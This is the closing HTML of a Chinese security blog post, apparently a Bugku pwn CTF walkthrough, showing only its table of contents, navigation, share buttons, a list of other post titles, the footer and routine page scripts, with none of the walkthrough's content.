            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target="_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



<nav id="article-nav">
  
    <a href="/2020/04/07/classical-configuration-writing-vulnerability-note/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption"><</strong>
      <div class="article-nav-title">
        
          经典写配置漏洞笔记
        
      </div>
    </a>
  
  
    <a href="/2020/02/22/jinja2-ssti/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">Jinja2模板注入笔记</div>
      <strong class="article-nav-caption">></strong>
    </a>
  
</nav>

  
</article>

    <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1"><span class="toc-number">2.</span> <span class="toc-text">pwn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn2"><span class="toc-number">3.</span> <span class="toc-text">pwn2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn4"><span class="toc-number">4.</span> <span class="toc-text">pwn4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn5"><span class="toc-number">5.</span> <span class="toc-text">pwn5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn3"><span class="toc-number">6.</span> <span class="toc-text">pwn3</span></a></li></ol>
</div>
<input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">

<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script>
    var valueHide = "隐藏目录";
    var valueShow = "显示目录";

    if ($(".left-col").is(":hidden")) {
        $("#tocButton").attr("value", valueShow);
    }
    $("#tocButton").click(function() {
        if ($("#toc").is(":hidden")) {
            $("#tocButton").attr("value", valueHide);
            $("#toc").slideDown(320);
        }
        else {
            $("#tocButton").attr("value", valueShow);
            $("#toc").slideUp(350);
        }
    })
    if ($(".toc").length < 1) {
        $("#toc, #tocButton").hide();
    }
</script>





<div class="bdsharebuttonbox">
	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
</div>
<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>




    



    <div class="scroll" id="post-nav-button">
        
            <a href="/2020/04/07/classical-configuration-writing-vulnerability-note/" title="上一篇: 经典写配置漏洞笔记">
                <i class="fa fa-angle-left"></i>
            </a>
        
        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
        
            <a href="/2020/02/22/jinja2-ssti/" title="下一篇: Jinja2模板注入笔记">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>
    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/12/19/social-engineering-database/">Social Engineering Database Setup</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/08/kernel-development-environment/">Kernel开发环境配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/19/windows-knowledge/">Windows知识点</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/07/classical-configuration-writing-vulnerability-note/">经典写配置漏洞笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/16/Bugku-Pwn-Walkthrough/">Bugku Pwn Walkthrough</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/22/jinja2-ssti/">Jinja2模板注入笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/27/cuda-for-nvidia1080ti/">Ubuntu18.04配置CUDA支持（NVIDIA 1080Ti）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/29/docker整理/">docker整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/03/upload-labs-writeup/">upload-labs复现笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/22/nustctf2019-web-writeup/">NUSTCTF2019 Web题解（部分）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/22/NUSTCTF2019-notes-of-creating-challenges/">NUSTCTF2019出题笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/10/python-basics/">Python基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/03/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/">如何用P4wnP1_aloa进行HID攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/21/shell-script-notes/">ShellScript笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/19/bash-commands-notes/">Bash笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/28/how-to-import-mkv-into-Adobe-Premiere/">如何将mkv视频导入Adobe Premiere</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/08/shell-made-of-symbols/">纯符号shell的学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/20/nust-ctf-e5-b8-88-e5-82-85-e4-bb-ac-e7-9a-84blogs/">师傅们的blogs</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/06/php-e6-96-87-e4-bb-b6-e5-92-8c-e7-9b-ae-e5-bd-95-e7-ac-94-e8-ae-b0-e8-a1-a5-e5-85-85/">PHP文件和目录 笔记补充</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/04/how-to-install-sqli-labs-on-windows-10/">How to install sqli-labs on Windows 10</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/02/xamppdvwa-on-windows-10-installation-guide/">XAMPP+DVWA on Windows 10 installation guide</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/29/vmware-workstation-pro12kali2017-3-e5-ae-89-e8-a3-85-e8-ae-b0-e5-bd-95/">VMware Workstation Pro12+Kali2017.3安装记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/29/regex-notes/">正则补充</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/28/php-e7-ac-94-e8-ae-b0/">PHP笔记</a></li></ul>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
    <script>
        $(".post-list").addClass("toc-article");
        $(".post-list-item a").attr("target","_blank");
        $("#post-nav-button > a:nth-child(2)").click(function() {
            $(".fa-bars, .fa-times").toggle();
            $(".post-list").toggle(300);
            if ($(".toc").length > 0) {
                $("#toc, #tocButton").toggle(200, function() {
                    if ($(".switch-area").is(":visible")) {
                        $("#tocButton").attr("value", valueHide);
                        }
                    })
            }
            else {
            }
        })
    </script>



    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2020 漏断
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style="display:none">
                        <span id="site-visit">总浏览量: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style="display:none">
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>

    <script>
        $(document).ready(function() {
            var backgroundnum = 3;
            var backgroundimg = "url(/background/bg-" + backgroundnum +".jpg)";
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


  </div>
</body>
</html>